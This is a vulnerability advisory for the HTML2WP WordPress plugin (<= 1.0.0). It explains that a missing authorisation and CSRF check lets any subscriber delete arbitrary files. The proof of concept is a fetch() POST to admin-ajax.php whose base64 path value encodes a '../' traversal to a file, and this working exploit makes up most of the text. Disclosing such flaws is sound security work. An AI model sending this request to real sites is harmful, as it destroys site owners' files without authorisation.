## WordPress Plugin Vulnerabilities

# HTML2WP <= 1.0.0 - Subscriber+ Arbitrary File Deletion

### Description

The plugin does not have authorisation and CSRF checks in an AJAX action, available to any authenticated users such as subscriber, which could allow them to delete arbitrary file

### Proof of Concept

await fetch("https://example.com/wp-admin/admin-ajax.php?action=html\_actions", {
"credentials": "include",
"headers": {
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8",
"Accept-Language": "de,en;q=0.7,en-US;q=0.3",
"Content-Type": "application/x-www-form-urlencoded",
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Dest": "document",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-User": "?1"
},
"body": "type=remove\_html&path=Li4vbGljZW5zZS50eHQ=",
"method": "POST",
"mode": "cors"
});
